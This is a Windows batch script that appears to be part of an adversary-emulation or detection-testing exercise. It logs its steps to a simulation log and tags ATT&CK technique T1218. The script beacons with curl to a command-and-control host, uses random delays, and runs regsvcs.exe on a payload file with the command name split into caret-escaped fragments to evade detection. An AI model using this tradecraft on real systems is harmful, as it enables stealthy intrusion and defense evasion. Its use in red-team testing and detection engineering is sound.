@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET txisnba=%APPDATA%\8628\b04d7519
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8628-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=visio.txt
SET dvhhyc=8628
SET akjdh=!rrocubc!
SET qwzxc=!dvhhyc!

SET logvar=%APPDATA%\!akjdh!\macula-simulations.log
SET agentvar=!jwcnifl!
SET resvar=1
SET errvar=

REM Initial random delay
SET /A rdelay=!RANDOM! %% 31 + 30
echo [%DATE% %TIME%][DEBUG][!agentvar!]: initial_delay=!rdelay!s>> "!logvar!" 2>nul
timeout /t !rdelay! /nobreak >nul

REM C2 Heartbeat (DO NOT OBFUSCATE)
echo [%DATE% %TIME%][DEBUG][!agentvar!]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [%DATE% %TIME%][DEBUG][!agentvar!]: heartbeat_complete>> "!logvar!" 2>nul

ping -n 12 127.0.0.1 >nul

REM Change directory
echo [%DATE% %TIME%][DEBUG][!agentvar!]: chdir_start=!txisnba!>> "!logvar!" 2>nul
cd /d "!txisnba!" 2>nul
if errorlevel 1 (
    SET resvar=0
    SET errvar=directory_not_found
)
echo [%DATE% %TIME%][DEBUG][!agentvar!]: chdir_complete=!errorlevel!>> "!logvar!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul

REM Obfuscated regsvcs.exe execution with fragments
SET cmd1=r^e
SET cmd2=g^s^v
SET cmd3=c^s^.
SET cmd4=e^x^e
SET fvar=!xzanpex!

echo [%DATE% %TIME%][DEBUG][!agentvar!]: process_start=!cmd1!!cmd2!!cmd3!!cmd4! !fvar!>> "!logvar!" 2>nul
!cmd1!!cmd2!!cmd3!!cmd4! "!fvar!" 2>nul
if errorlevel 1 (
    SET resvar=0
    SET errvar=execution_failed
)
echo [%DATE% %TIME%][DEBUG][!agentvar!]: process_complete=!errorlevel!>> "!logvar!" 2>nul

SET /A rdelay2=!RANDOM! %% 11 + 5
timeout /t !rdelay2! /nobreak >nul

REM TTP logging
SET ts=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,8!.!TIME:~9,3!
echo [!ts!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|SignedBinaryProxyExecution=!resvar!:!errvar!>> "!logvar!" 2>nul

ENDLOCAL